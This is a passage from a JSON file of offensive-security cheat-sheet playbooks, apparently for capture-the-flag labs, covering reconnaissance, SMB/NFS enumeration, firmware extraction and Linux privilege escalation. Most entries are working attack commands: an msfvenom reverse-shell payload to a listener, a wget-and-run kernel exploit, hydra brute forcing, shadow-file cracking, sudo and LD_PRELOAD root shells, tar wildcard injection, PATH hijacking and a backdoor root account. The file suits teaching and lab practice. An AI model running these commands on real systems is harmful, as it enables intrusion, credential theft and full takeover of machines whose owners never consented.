        "label": "Source cheatshit 5 - block 25",
        "cmd": "filesystem.jffs2\n       │\n       │ raw bytes\n       ▼\n/dev/mtdblock0"
      },
      {
        "label": "Source cheatshit 5 - block 26",
        "cmd": "sudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2_file/"
      },
      {
        "label": "Source cheatshit 5 - block 27",
        "cmd": "💾 block device\n   ↓\n🧱 JFFS2\n   ↓\n📂 /mnt/jffs2_file/"
      },
      {
        "label": "Source cheatshit 5 - block 28",
        "cmd": "SquashFS\nUBIFS\nCramFS\nYAFFS\next filesystem\ncustom container"
      },
      {
        "label": "Source cheatshit 5 - block 29",
        "cmd": "🔎 Identify filesystem\n       ↓\n🤔 What filesystem is it?\n       ↓\n🛠️ Choose appropriate extraction/mount method"
      },
      {
        "label": "Source cheatshit 5 - block 30",
        "cmd": "/etc/passwd\n/etc/shadow"
      },
      {
        "label": "Source cheatshit 5 - block 31",
        "cmd": "📁 /etc\n   │\n   ├── 👥 passwd\n   └── 🔐 shadow"
      },
      {
        "label": "Source cheatshit 5 - block 32",
        "cmd": "Browser\n   ↓\n🌐 Web UI\n   ↓\n/www\n/htdocs\n   ↓\nHTML\nPHP\nJS\ntemplates\nconfig"
      },
      {
        "label": "Source cheatshit 5 - block 33",
        "cmd": "🔐 authentication\n⚙️ configuration\n🌐 API endpoints\n🧠 business logic"
      },
      {
        "label": "Source cheatshit 5 - block 34",
        "cmd": "/etc/system_defaults"
      },
      {
        "label": "Source cheatshit 5 - block 35",
        "cmd": "🏭 Factory defaults\n🔑 Default credentials\n📡 AP keys\n⚙️ Device settings"
      },
      {
        "label": "Source cheatshit 5 - block 36",
        "cmd": "SquashFS?\nJFFS2?\nUBIFS?\nCustom?"
      },
      {
        "label": "Source cheatshit 5 - block 37",
        "cmd": "version?\narchitecture?\nmodules?"
      },
      {
        "label": "Source cheatshit 5 - block 38",
        "cmd": "/etc/passwd\n/etc/shadow"
      },
      {
        "label": "Source cheatshit 5 - block 39",
        "cmd": "/www\n/htdocs\n/cgi-bin"
      },
      {
        "label": "Source cheatshit 5 - block 40",
        "cmd": "config\nkeys\npasswords\ncertificates\ndefault settings"
      },
      {
        "label": "Source cheatshit 5 - block 41",
        "cmd": "ARM?\nMIPS?\nx86?\nARM64?"
      },
      {
        "label": "Source cheatshit 5 - block 42",
        "cmd": "📦 Binary\n   ↓\n🧠 CPU architecture\n   ↓\n🔬 Disassembly / execution"
      },
      {
        "label": "Source cheatshit 5 - block 43",
        "cmd": "COMPRESSED DATA"
      },
      {
        "label": "Source cheatshit 5 - block 44",
        "cmd": "🗜️ Compression\n= \"жижиг болгож багцалсан\"\n\n📁 Filesystem\n= \"файлуудыг зохион байгуулсан бүтэц\""
      },
      {
        "label": "Source cheatshit 5 - block 45",
        "cmd": "📉 Low entropy\n→ structure/text илүү харагдах\n\n📈 High entropy\n→ compressed/encrypted/random-looking"
      },
      {
        "label": "Source cheatshit 5 - block 46",
        "cmd": "📦 extract\n ↓\n🧾 strings\n ↓\n🔍 grep/search\n ↓\n🎯 interesting binary\n ↓\n🔬 deeper RE"
      },
      {
        "label": "Source cheatshit 5 - block 47",
        "cmd": "\"admin\"\n\"password\"\n\"http\"\n\"/cgi-bin/\"\n\"telnet\"\n\"ssh\"\n\"factory\""
      },
      {
        "label": "Source cheatshit 5 - block 48",
        "cmd": "📦 FIRMWARE\n                      │\n                      ▼\n                🔎 BINWALK\n                      │\n             \"Юу дотор байна?\"\n                      │\n                      ▼\n                  ✂️ EXTRACT\n                      │\n                      ▼\n             🧩 IDENTIFY FORMAT\n                      │\n        ┌─────────────┼─────────────┐\n        ▼             ▼             ▼\n      JFFS2        SquashFS       UBIFS\n        │\n        ▼\n       🧱 MOUNT\n        │\n        ▼\n       📂 ROOT FS\n        │\n   ┌────┼────┬─────────┐\n   ▼    ▼    ▼         ▼\n /etc  /www  configs  binaries\n   │    │      │          │\n   ▼    ▼      ▼          ▼\n users web    secrets     🔬 RE\n   │    │\n   └────┴──────────┬─────────\n                   ▼\n                🧠 DEVICE\n                   LOGIC"
      },
      {
        "label": "Source cheatshit 5 - block 49",
        "cmd": "📦 FIRMWARE\n│\n├── 🔎 binwalk\n│     └── \"What layers exist?\"\n│\n├── ✂️ extract\n│     └── \"Give me the pieces.\"\n│\n├── 🧩 identify FS\n│     └── JFFS2 / SquashFS / UBIFS / ...\n│\n├── 🧱 mount\n│     └── \"Turn filesystem into folders.\"\n│\n├── 🧬 architecture\n│     └── ARM / MIPS / x86 / ARM64\n│\n├── 🧠 kernel\n│     └── version / modules\n│\n├── 👥 accounts\n│     └── /etc/passwd / shadow\n│\n├── 🌐 web\n│     └── /www /htdocs /cgi-bin\n│\n├── 🔑 secrets\n│     └── configs / keys / credentials\n│\n├── 🏭 defaults\n│     └── factory settings\n│\n└── 🔬 binaries\n      └── strings → disassemble → trace"
      },
      {
        "label": "Source cheatshit 5 - block 50",
        "cmd": "🛰️ RECON\n\"What exists?\"\n\n      ↓\n\n🚪 SERVICES\n\"What is exposed?\"\n\n      ↓\n\n🔓 ACCESS\n\"What can I interact with?\"\n\n      ↓\n\n⬆️ PRIV ESC\n\"What trust/permission can be abused?\"\n\n      ↓\n\n🔬 RE\n\"What is the binary actually doing?\"\n\n      ↓\n\n📦 FIRMWARE\n\"What is hidden inside the device?\""
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-8",
    "title": "cheatshit",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit.md",
    "methodology": "Source file: cheater/cheatshit.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit - block 1",
        "cmd": "🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE"
      },
      {
        "label": "Source cheatshit - block 2",
        "cmd": "whois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\""
      },
      {
        "label": "Source cheatshit - block 3",
        "cmd": "curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq ."
      },
      {
        "label": "Source cheatshit - block 4",
        "cmd": "dig @1.1.1.1 target.com [A|AAAA|CNAME|MX|TXT]"
      },
      {
        "label": "Source cheatshit - block 5",
        "cmd": "dig +short target.com [TYPE]"
      },
      {
        "label": "Source cheatshit - block 6",
        "cmd": "https://crt.sh/?q=%.target.com"
      },
      {
        "label": "Source cheatshit - block 7",
        "cmd": "curl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u"
      },
      {
        "label": "Source cheatshit - block 8",
        "cmd": "hostname:\"target.com\"\norg:\"Target Corp\"\nproduct:\"Apache\"\nport:80"
      },
      {
        "label": "Source cheatshit - block 9",
        "cmd": "ping -c 4 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 10",
        "cmd": "≈ 64   → Linux\n≈ 128  → Windows"
      },
      {
        "label": "Source cheatshit - block 11",
        "cmd": "traceroute [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 12",
        "cmd": "traceroute -T -p 80 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 13",
        "cmd": "nc [TARGET_IP] [PORT]"
      },
      {
        "label": "Source cheatshit - block 14",
        "cmd": "nc [TARGET_IP] 80"
      },
      {
        "label": "Source cheatshit - block 15",
        "cmd": "GET / HTTP/1.1\nHost: target"
      },
      {
        "label": "Source cheatshit - block 16",
        "cmd": "Double Enter"
      },
      {
        "label": "Source cheatshit - block 17",
        "cmd": "curl -I http://[TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 18",
        "cmd": "nmap -p- -T4 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 19",
        "cmd": "nmap -sV -sC -Pn -p [PORTS] [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 20",
        "cmd": "nmap -sS -p [PORTS] [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 21",
        "cmd": "enum4linux -a [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 22",
        "cmd": "smbclient //[TARGET_IP]/[SHARE_NAME] -U Anonymous"
      },
      {
        "label": "Source cheatshit - block 23",
        "cmd": "get id_rsa\nget backup.zip"
      },
      {
        "label": "Source cheatshit - block 24",
        "cmd": "showmount -e [TARGET_IP]"
      },
      {
        "label": "Source cheatshit - block 25",
        "cmd": "sudo mount -t nfs [TARGET_IP]:[EXPORT_PATH] /mnt/target/ -nolock"
      },
      {
        "label": "Source cheatshit - block 26",
        "cmd": "no_root_squash"
      },
      {
        "label": "Source cheatshit - block 27",
        "cmd": "sudo tcpdump ip proto \\icmp -i tun0"
      },
      {
        "label": "Source cheatshit - block 28",
        "cmd": ".RUN ping [KALI_IP] -c 1"
      },
      {
        "label": "Source cheatshit - block 29",
        "cmd": "Ping arrives?\n   ↓\nYES\n   ↓\nRCE confirmed"
      },
      {
        "label": "Source cheatshit - block 30",
        "cmd": "msfvenom -p cmd/unix/reverse_netcat lhost=[KALI_IP] lport=4444 R"
      },
      {
        "label": "Source cheatshit - block 31",
        "cmd": "nc -lvnp 4444"
      },
      {
        "label": "Source cheatshit - block 32",
        "cmd": "Target  ───────►  Kali listener\n          outbound"
      },
      {
        "label": "Source cheatshit - block 33",
        "cmd": "hydra -t 16 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] [ssh|ftp|mysql]"
      },
      {
        "label": "Source cheatshit - block 34",
        "cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt"
      },
      {
        "label": "Source cheatshit - block 35",
        "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt"
      },
      {
        "label": "Source cheatshit - block 36",
        "cmd": "hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O"
      },
      {
        "label": "Source cheatshit - block 37",
        "cmd": "1️⃣ SUDO\n   ↓\n2️⃣ SUID / CAPS\n   ↓\n3️⃣ CRON\n   ↓\n4️⃣ FILES / CREDS\n   ↓\n5️⃣ PATH\n   ↓\n6️⃣ .SO HIJACK\n   ↓\n7️⃣ HISTORY / CONFIG\n   ↓\n8️⃣ KERNEL"
      },
      {
        "label": "Source cheatshit - block 38",
        "cmd": "[Step 1: Sudo]\n       ↓\n[Step 2: SUID/Caps]\n       ↓\n[Step 3: Cron]\n       ↓\n[Step 4: Files]\n       ↓\n[Step 5: Local Ports]"
      },
      {
        "label": "Source cheatshit - block 39",
        "cmd": "sudo -l"
      },
      {
        "label": "Source cheatshit - block 40",
        "cmd": "gtfobins.github.io"
      },
      {
        "label": "Source cheatshit - block 41",
        "cmd": "sudo find . -exec /bin/bash \\; -quit"
      },
      {
        "label": "Source cheatshit - block 42",
        "cmd": "sudo less /etc/profile"
      },
      {
        "label": "Source cheatshit - block 43",
        "cmd": "!/bin/sh"
      },
      {
        "label": "Source cheatshit - block 44",
        "cmd": "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
      },
      {
        "label": "Source cheatshit - block 45",
        "cmd": "sudo vim -c '!sh'"
      },
      {
        "label": "Source cheatshit - block 46",
        "cmd": "sudo nano\n→ Ctrl+R\n→ Ctrl+X\n→ reset; sh 1>&0 2>&0"
      },
      {
        "label": "Source cheatshit - block 47",
        "cmd": "env_keep += LD_PRELOAD"
      },
      {
        "label": "Source cheatshit - block 48",
        "cmd": "void _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}"
      },
      {
        "label": "Source cheatshit - block 49",
        "cmd": "gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles"
      },
      {
        "label": "Source cheatshit - block 50",
        "cmd": "sudo LD_PRELOAD=/tmp/shell.so [ANY_ALLOWED_BINARY]"
      },
      {
        "label": "Source cheatshit - block 51",
        "cmd": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "label": "Source cheatshit - block 52",
        "cmd": "find / -perm -4000"
      },
      {
        "label": "Source cheatshit - block 53",
        "cmd": "base64 /etc/shadow | base64 --decode"
      },
      {
        "label": "Source cheatshit - block 54",
        "cmd": "base64 /root/root.txt | base64 --decode"
      },
      {
        "label": "Source cheatshit - block 55",
        "cmd": "openssl passwd -1 -salt evil Password123"
      },
      {
        "label": "Source cheatshit - block 56",
        "cmd": "evil:[GENERATED_HASH]:0:0:root:/root:/bin/bash"
      },
      {
        "label": "Source cheatshit - block 57",
        "cmd": "su evil"
      },
      {
        "label": "Source cheatshit - block 58",
        "cmd": "getcap -r / 2>/dev/null"
      },
      {
        "label": "Source cheatshit - block 59",
        "cmd": "cap_setuid+ep"
      },
      {
        "label": "Source cheatshit - block 60",
        "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
      },
      {
        "label": "Source cheatshit - block 61",
        "cmd": "cat /etc/crontab"
      },
      {
        "label": "Source cheatshit - block 62",
        "cmd": "ls -la /etc/cron.* /var/spool/cron/crontabs/"
      },
      {
        "label": "Source cheatshit - block 63",
        "cmd": "Root runs script\n      ↓\nScript is writable\n      ↓\nModify script"
      },
      {
        "label": "Source cheatshit - block 64",
        "cmd": "touch /path/to/target/--checkpoint=1"
      },
      {
        "label": "Source cheatshit - block 65",
        "cmd": "touch '/path/to/target/--checkpoint-action=exec=sh shell.sh'"
      },
      {
        "label": "Source cheatshit - block 66",
        "cmd": "system(\"service\")\nsystem(\"thm\")"
      },
      {
        "label": "Source cheatshit - block 67",
        "cmd": "echo $PATH"
      },
      {
        "label": "Source cheatshit - block 68",
        "cmd": "export PATH=/tmp:$PATH"
      },
      {
        "label": "Source cheatshit - block 69",
        "cmd": "echo '/bin/bash -p' > /tmp/thm\nchmod +x /tmp/thm"
      },
      {
        "label": "Source cheatshit - block 70",
        "cmd": "Root program\n    ↓\ncalls \"thm\"\n    ↓\nPATH searched first\n    ↓\n/tmp/thm"
      },
      {
        "label": "Source cheatshit - block 71",
        "cmd": "strace [SUID_BINARY] 2>&1 | grep -iE \"open|access|no such file\""
      },
      {
        "label": "Source cheatshit - block 72",
        "cmd": "Missing .so\n   +\nWritable user directory\n   +\nRPATH / RUNPATH behavior"
      },
      {
        "label": "Source cheatshit - block 73",
        "cmd": "static void inject() __attribute__((constructor));\n\nvoid inject() {\n    system(\"/bin/bash -p\");\n}"
      },
      {
        "label": "Source cheatshit - block 74",
        "cmd": "gcc -shared -fPIC -o /path/to/missing_lib.so payload.c"
      },
      {
        "label": "Source cheatshit - block 75",
        "cmd": "cat ~/.bash_history"
      },
      {
        "label": "Source cheatshit - block 76",
        "cmd": "grep -iE \"passw|user|admin|mysql|key\" ~/.bash_history"
      },
      {
        "label": "Source cheatshit - block 77",
        "cmd": "cat /etc/openvpn/auth.txt"
      },
      {
        "label": "Source cheatshit - block 78",
        "cmd": "cat ~/.irssi/config"
      },
      {
        "label": "Source cheatshit - block 79",
        "cmd": "cat /var/www/html/wp-config.php"
      },
      {
        "label": "Source cheatshit - block 80",
        "cmd": "grep -rnwi \"password\" /home/ /etc/ /var/www/ 2>/dev/null"
      },
      {
        "label": "Source cheatshit - block 81",
        "cmd": "uname -a"
      },
      {
        "label": "Source cheatshit - block 82",
        "cmd": "cat /etc/issue"
      },
      {
        "label": "Source cheatshit - block 83",
        "cmd": "python3 -m http.server 8000"
      },
      {
        "label": "Source cheatshit - block 84",
        "cmd": "wget http://[KALI_IP]:8000/exploit.c -O /tmp/exploit.c"
      },
      {
        "label": "Source cheatshit - block 85",
        "cmd": "gcc -O2 -pthread /tmp/exploit.c -o /tmp/exploit"
      },
      {
        "label": "Source cheatshit - block 86",
        "cmd": "chmod +x /tmp/exploit && /tmp/exploit"
      },
      {
        "label": "Source cheatshit - block 87",
        "cmd": "CVE-2015-1328 → OverlayFS Local Root\nCVE-2016-5195 → Dirty COW"
      },
      {
        "label": "Source cheatshit - block 88",
        "cmd": "Overwrite RIP\n    ↓\nRedirect execution"
      },
      {
        "label": "Source cheatshit - block 89",
        "cmd": "1 = True\n0 = False"
      },
      {
        "label": "Source cheatshit - block 90",
        "cmd": "RAX  64-bit  ┌─────────────────────────────┐\n             │                             │\nEAX  32-bit  ├────────────────────         │\n             │                    │         │\nAX   16-bit  ├────────────        │         │\n             │            │       │         │\nAL    8-bit  ├────        │       │         │\n             └────┬───────┴───────┴─────────┘"
      },
      {
        "label": "Source cheatshit - block 91",
        "cmd": "RAX → EAX → AX → AL\n64     32     16    8"
      },
      {
        "label": "Source cheatshit - block 92",
        "cmd": "1st → RCX\n2nd → RDX\n3rd → R8\n4th → R9\n5th+ → Stack"
      },
      {
        "label": "Source cheatshit - block 93",
        "cmd": "MOV destination, source"
      },
      {
        "label": "Source cheatshit - block 94",
        "cmd": "[ ]"
      },
      {
        "label": "Source cheatshit - block 95",
        "cmd": "LEA destination, [Address]"
      },
      {
        "label": "Source cheatshit - block 96",
        "cmd": "XOR register, register"
      },
      {
        "label": "Source cheatshit - block 97",
        "cmd": "CMP destination, source"
      },
      {
        "label": "Source cheatshit - block 98",
        "cmd": "ZF = Zero Flag\nSF = Sign Flag\nOF = Overflow Flag"
      },
      {
        "label": "Source cheatshit - block 99",
        "cmd": "JE / JZ   → Equal / Zero\nJNE / JNZ → Not equal / Not zero\nJG / JL   → Signed\nJA / JB   → Unsigned"
      },
      {
        "label": "Source cheatshit - block 100",
        "cmd": "\\x90"
      },
      {
        "label": "Source cheatshit - block 101",
        "cmd": "PUSH → RSP decreases\nPOP  → RSP increases"
      },
      {
        "label": "Source cheatshit - block 102",
        "cmd": "0x77AABBCC"
      },
      {
        "label": "Source cheatshit - block 103",
        "cmd": "\\xCC\\xBB\\xAA\\x77"
      },
      {
        "label": "Source cheatshit - block 104",
        "cmd": "objdump -M intel -d [BINARY] > source.asm"
      },
      {
        "label": "Source cheatshit - block 105",
        "cmd": "grep -B 15 \"call.*<target_func>\" source.asm"
      },
      {
        "label": "Source cheatshit - block 106",
        "cmd": "grep -A 20 \"target_func\" source.asm"
      },
      {
        "label": "Source cheatshit - block 107",
        "cmd": "ltrace ./[BINARY] [ARGUMENTS]"
      },
      {
        "label": "Source cheatshit - block 108",
        "cmd": "strcmp\nstrncmp\nprintf"
      },
      {
        "label": "Source cheatshit - block 109",
        "cmd": "strings -n 6 [BINARY]"
      },
      {
        "label": "Source cheatshit - block 110",
        "cmd": "binwalk [FIRMWARE.img]"
      },
      {
        "label": "Source cheatshit - block 111",
        "cmd": "binwalk -e [FIRMWARE.img]"
      },
      {
        "label": "Source cheatshit - block 112",
        "cmd": "sudo mknod /dev/mtdblock0 b 31 0"
      },
      {
        "label": "Source cheatshit - block 113",
        "cmd": "sudo modprobe jffs2 mtdram mtdblock"
      },
      {
        "label": "Source cheatshit - block 114",
        "cmd": "sudo dd if=filesystem.jffs2 of=/dev/mtdblock0"
      },
      {
        "label": "Source cheatshit - block 115",
        "cmd": "sudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2_file/"
      },
      {
        "label": "Source cheatshit - block 116",
        "cmd": "WHOIS → DNS → CRT → SHODAN/CENSYS"
      },
      {
        "label": "Source cheatshit - block 117",
        "cmd": "PING → TRACE → BANNER → NMAP"
      },
      {
        "label": "Source cheatshit - block 118",
        "cmd": "21 FTP\n22 SSH\n23 Telnet\n25 SMTP\n139/445 SMB\n2049/111 NFS\n3306 MySQL"
      },
      {
        "label": "Source cheatshit - block 119",
        "cmd": "SUDO\n ↓\nSUID / CAPS\n ↓\nCRON\n ↓\nFILES / CREDS\n ↓\nPATH\n ↓\n.SO\n ↓\nHISTORY\n ↓\nKERNEL"
      },
      {
        "label": "Source cheatshit - block 120",
        "cmd": "RIP = GPS\nRAX = Return\nRAX > EAX > AX > AL\nRCX → RDX → R8 → R9 → Stack\nMOV = Copy\nLEA = Address\nXOR = Zero\nCMP = Compare\nJCC = Branch\nNOP = Nothing"
      },
      {
        "label": "Source cheatshit - block 121",
        "cmd": "BINWALK\n  ↓\nEXTRACT\n  ↓\nMOUNT\n  ↓\nCHECK /etc\n  ↓\nCHECK WEB FILES\n  ↓\nCHECK DEFAULTS"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-9",
    "title": "finding",
    "category": "linux",
    "description": "Imported command reference from KS: finding.md",
    "methodology": "Source file: finding.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source finding - block 1",
        "cmd": "🏠 LINUX\n                    │\n       ┌────────────┼────────────┐\n       ▼            ▼            ▼\n   🔎 fFIND       🧠 GREP      🔑 PERMISSIONS\n       │            │            │\n   \"ХААНА?\"      \"ДОТОР ЮУ?\"   \"ХЭН ЧАДАХ?\"\n       │            │            │\n       └────────────┼────────────┘\n                    ▼\n                 ⏰ TIME\n                    │\n                    ▼\n                ⚙️ PROCESSES\n                    │\n                    ▼\n                🤖 CRON"
      },
      {
        "label": "Source finding - block 2",
        "cmd": "find / -name \"root.txt\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 3",
        "cmd": "🏠 /\n├── home/\n├── etc/\n├── var/\n├── opt/\n└── ...\n      ↓\n🔎 \"root.txt байна уу?\""
      },
      {
        "label": "Source finding - block 4",
        "cmd": "find / -name \"user.txt\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 5",
        "cmd": "find / -iname \"*flag*\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 6",
        "cmd": "flag\nFLAG\nFlag\nmyflag.txt\nFLAG_backup"
      },
      {
        "label": "Source finding - block 7",
        "cmd": "find /home /var /opt -name \"*.txt\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 8",
        "cmd": "/home/a.txt\n/home/notes.txt\n/var/log.txt\n/opt/backup.txt"
      },
      {
        "label": "Source finding - block 9",
        "cmd": "find / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 10",
        "cmd": ".bak\n.old\n.backup"
      },
      {
        "label": "Source finding - block 11",
        "cmd": "find / -name \"*.txt\""
      },
      {
        "label": "Source finding - block 12",
        "cmd": "find: '/root': Permission denied\nfind: '/proc/...': Permission denied\n..."
      },
      {
        "label": "Source finding - block 13",
        "cmd": "2>/dev/null"
      },
      {
        "label": "Source finding - block 14",
        "cmd": "stderr\n  ↓\n/dev/null\n  ↓\n🗑️ discard"
      },
      {
        "label": "Source finding - block 15",
        "cmd": "Program\n ├── stdout → 👀 дэлгэц\n └── stderr → 🗑️ /dev/null"
      },
      {
        "label": "Source finding - block 16",
        "cmd": "grep -rn \"THM{\" /root /home /var /opt 2>/dev/null"
      },
      {
        "label": "Source finding - block 17",
        "cmd": "/home\n ├── a.txt\n ├── notes\n └── app/\n       └── config.txt\n             ↓\n        grep \"THM{\""
      },
      {
        "label": "Source finding - block 18",
        "cmd": "-r = 🔁 Recursive\n-n = 🔢 line Number"
      },
      {
        "label": "Source finding - block 19",
        "cmd": "grep -rni \"password\" /var/www/ /opt/ 2>/dev/null"
      },
      {
        "label": "Source finding - block 20",
        "cmd": "-r → recursive\n-n → line number\n-i → ignore case"
      },
      {
        "label": "Source finding - block 21",
        "cmd": "grep -rn --include=\"*.php\" \"DB_PASSWORD\" /var/www/"
      },
      {
        "label": "Source finding - block 22",
        "cmd": "/var/www"
      },
      {
        "label": "Source finding - block 23",
        "cmd": "*.php"
      },
      {
        "label": "Source finding - block 24",
        "cmd": "/var/www\n ├── index.php     ✅ search\n ├── config.php    ✅ search\n ├── logo.png      ❌ skip\n └── style.css     ❌ skip"
      },
      {
        "label": "Source finding - block 25",
        "cmd": "grep -rl \"flag\" /home/ 2>/dev/null"
      },
      {
        "label": "Source finding - block 26",
        "cmd": "a.txt       ❌\nnotes.txt   ✅\nconfig.php  ❌\nsecret.txt  ✅"
      },
      {
        "label": "Source finding - block 27",
        "cmd": "notes.txt\nsecret.txt"
      },
      {
        "label": "Source finding - block 28",
        "cmd": "🔎 FIND\n= WHERE IS THE FILE?\n\n🧠 GREP\n= WHAT IS INSIDE THE FILE?"
      },
      {
        "label": "Source finding - block 29",
        "cmd": "find / -name \"*.conf\"\n        ↓\n📍 CONFIG хаана?\n\ngrep -r \"password\" /etc\n        ↓\n🔑 password дотор байна уу?"
      },
      {
        "label": "Source finding - block 30",
        "cmd": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "label": "Source finding - block 31",
        "cmd": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "label": "Source finding - block 32",
        "cmd": "👤 You\n   ↓\n⚙️ SUID program\n   ↓\n🪪 owner-ийн эрхийн context"
      },
      {
        "label": "Source finding - block 33",
        "cmd": "find / -type f -perm -o+w 2>/dev/null"
      },
      {
        "label": "Source finding - block 34",
        "cmd": "o = others\n+w = write"
      },
      {
        "label": "Source finding - block 35",
        "cmd": "-rw-rw-rw-"
      },
      {
        "label": "Source finding - block 36",
        "cmd": "WRITE\n+\nTRUSTED/PRIVILEGED USE"
      },
      {
        "label": "Source finding - block 37",
        "cmd": "find / -type d -perm -o+w 2>/dev/null"
      },
      {
        "label": "Source finding - block 38",
        "cmd": "-type f → 📄 file\n-type d → 📁 directory"
      },
      {
        "label": "Source finding - block 39",
        "cmd": "find / -group cage -writable 2>/dev/null"
      },
      {
        "label": "Source finding - block 40",
        "cmd": "find / -user weston 2>/dev/null"
      },
      {
        "label": "Source finding - block 41",
        "cmd": "📄 FILE\n ├── 👤 OWNER\n ├── 👥 GROUP\n └── 🌍 OTHERS"
      },
      {
        "label": "Source finding - block 42",
        "cmd": "READ\nWRITE\nEXECUTE"
      },
      {
        "label": "Source finding - block 43",
        "cmd": "find / -mmin -10 -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null"
      },
      {
        "label": "Source finding - block 44",
        "cmd": "⏰ 15:00\n      ↓\n15:10\n      ↓\n🔎 What changed recently?"
      },
      {
        "label": "Source finding - block 45",
        "cmd": "find /etc /var /opt -mtime -1 2>/dev/null"
      },
      {
        "label": "Source finding - block 46",
        "cmd": "find / -type f -size +50M 2>/dev/null"
      },
      {
        "label": "Source finding - block 47",
        "cmd": "📦 VM image\n📦 database dump\n📦 backup\n📦 archive\n📦 log"
      },
      {
        "label": "Source finding - block 48",
        "cmd": "find /var/log -type f -empty"
      },
      {
        "label": "Source finding - block 49",
        "cmd": "cat /etc/crontab"
      },
      {
        "label": "Source finding - block 50",
        "cmd": "ls -la /etc/cron.*"
      },
      {
        "label": "Source finding - block 51",
        "cmd": "cat /var/spool/cron/crontabs/* 2>/dev/null"
      },
      {
        "label": "Source finding - block 52",
        "cmd": "ps aux"
      },
      {
        "label": "Source finding - block 53",
        "cmd": "PID\nUSER\nCOMMAND"
      },
      {
        "label": "Source finding - block 54",
        "cmd": "ps -ef | grep python"
      },
      {
        "label": "Source finding - block 55",
        "cmd": "⚙️  process 1\n🐍 python\n⚙️  process 2\n⚙️  nginx\n🐍 python"
      },
      {
        "label": "Source finding - block 56",
        "cmd": "🏠 LINUX\n   │\n   ▼\n🔎 FIND\n\"ЮУ ХААНА БАЙНА?\"\n   │\n   ▼\n🧠 GREP\n\"ДОТОР ЮУ БАЙНА?\"\n   │\n   ▼\n🔑 PERMISSIONS\n\"ХЭН УНШИЖ/БИЧИЖ ЧАДАХ ВЭ?\"\n   │\n   ▼\n👤 OWNERSHIP\n\"ХЭНИЙХ ВЭ?\"\n   │\n   ▼\n⏰ TIMESTAMPS\n\"ХЭЗЭЭ ӨӨРЧЛӨГДСӨН ВЭ?\"\n   │\n   ▼\n⚙️ PROCESSES\n\"ЮУ ОДОО АЖИЛЛАЖ БАЙНА?\"\n   │\n   ▼\n🤖 CRON\n\"ЮУ АВТОМАТААР АЖИЛЛАДАГ ВЭ?\""
      },
      {
        "label": "Source finding - block 57",
        "cmd": "-name     → exact name/pattern\n-iname    → ignore case\n-type f   → files\n-type d   → directories"
      },
      {
        "label": "Source finding - block 58",
        "cmd": "-r     → recursive\n-n     → line number\n-i     → ignore case\n-l     → filenames only\n--include → certain file types"
      },
      {
        "label": "Source finding - block 59",
        "cmd": "4000   → SUID\n2000   → SGID\n\no+w    → others can write\n-user  → owned by user\n-group → owned by group"
      },
      {
        "label": "Source finding - block 60",
        "cmd": "-mmin -10\n→ last 10 minutes\n\n-mtime -1\n→ last 1 day"
      },
      {
        "label": "Source finding - block 61",
        "cmd": "ps aux\nps -ef"
      },
      {
        "label": "Source finding - block 62",
        "cmd": "/etc/crontab\n/etc/cron.*\n/var/spool/cron/..."
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-10",
    "title": "gobuster",
    "category": "network",
    "description": "Imported command reference from KS: gobuster.md",
    "methodology": "Source file: gobuster.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source gobuster - command 1",
        "cmd": "gobuster dir -u http://10.48.154.222 \\"
      },
      {
        "label": "Source gobuster - command 2",
        "cmd": "feroxbuster -u http://10.48.181.78 \\"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-11",
    "title": "Ignite",
    "category": "linux",
    "description": "Imported command reference from KS: Ignite.md",
    "methodology": "Source file: Ignite.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source Ignite - block 1",
